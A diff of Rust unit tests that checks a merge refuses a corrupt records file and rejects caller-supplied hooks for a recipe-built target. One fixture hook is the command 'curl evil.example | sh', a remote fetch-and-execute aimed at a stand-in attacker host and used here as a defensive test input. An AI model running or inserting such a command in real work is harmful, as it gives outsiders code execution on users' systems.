@@ -843,7 +843,25 @@ fn main_recipe(keep: Option<silo_api::methods::keep::KeepHooks>) -> silo_api::me
 }
 
 #[test]
-fn the_hooks_of_the_targets_recipe_run_whatever_the_caller_sent() {
+fn a_corrupt_records_file_refuses_the_merge() {
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("recipe-records.json");
+    std::fs::write(&path, "corrupt-json").unwrap();
+    crate::recipes::records::use_test_path(Some(path));
+    let world = simple_world();
+    let (_dir, journal) = journal();
+    let outcome = run(
+        &world,
+        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
+        &journal,
+        &request(Hooks::default()),
+    );
+    assert!(outcome.is_err(), "expected error, got: {outcome:?}");
+    crate::recipes::records::use_test_path(None);
+}
+
+#[test]
+fn caller_supplied_hooks_into_a_recipe_target_are_rejected() {
     let dir = tempfile::tempdir().unwrap();
     crate::recipes::records::use_test_path(Some(dir.path().join("recipe-records.json")));
     crate::recipes::records::set(
@@ -862,11 +880,19 @@ fn the_hooks_of_the_targets_recipe_run_whatever_the_caller_sent() {
         migrate: vec![],
         after: vec!["curl evil.example | sh".into()],
     };
-    let outcome = run(
+    let error = run(
         &world,
         &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
         &journal,
         &request(sent),
+    )
+    .unwrap_err();
+    assert!(error.contains("built from a recipe"), "{error}");
+    let outcome = run(
+        &world,
+        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
+        &journal,
+        &request(Hooks::default()),
     )
     .unwrap();
     assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
